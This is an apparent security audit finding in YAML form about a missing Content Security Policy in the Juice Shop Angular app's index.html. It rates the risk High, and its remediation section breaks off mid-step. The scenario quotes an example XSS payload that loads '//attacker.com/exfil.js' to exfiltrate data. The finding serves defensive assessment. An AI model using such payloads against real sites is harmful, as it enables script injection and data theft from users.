  title: Missing Content Security Policy on SPA — index.html:17
  affected_parameter: null
  scenario: 'The `index.html` at line 1-33 contains no `Content-Security-Policy` meta tag or header reference. The Angular
    SPA serves inline JavaScript (lines 17-28: the cookie consent initializer in an inline `<script>` block). Without CSP,
    any XSS payload that executes can: load remote scripts (`<script src=''//attacker.com/exfil.js''>`), exfiltrate data via
    `fetch()`, and inject arbitrary DOM content. A `default-src ''self''` CSP with a strict `script-src` would require nonces
    for the inline script and would prevent externally-loaded payloads from executing — significantly reducing XSS blast radius.
    The Juice Shop also loads Google Fonts from `fonts.googleapis.com` and `fonts.gstatic.com` without a `font-src` CSP directive.'
  evidence_summary: '`index.html` has no `<meta http-equiv="Content-Security-Policy">` and includes an inline `<script>` block
    at line 17, confirming zero CSP protection.'
  impact_description: Any successful XSS payload has unrestricted script execution capability and can load attacker-controlled
    external resources for data exfiltration.
  likelihood: High
  impact: High
  risk: High
  controls_in_place: Angular's template interpolation escapes data-bound expressions, but this is entirely bypassed by the
    bypassSecurityTrustHtml calls elsewhere.
  mitigation_title: Add a strict Content Security Policy to the SPA via HTTP response header
  remediation:
    effort: Medium
    steps:
    - 'Add a `Content-Security-Policy` HTTP response header in the backend serving the Angular SPA: `default-src ''self'';
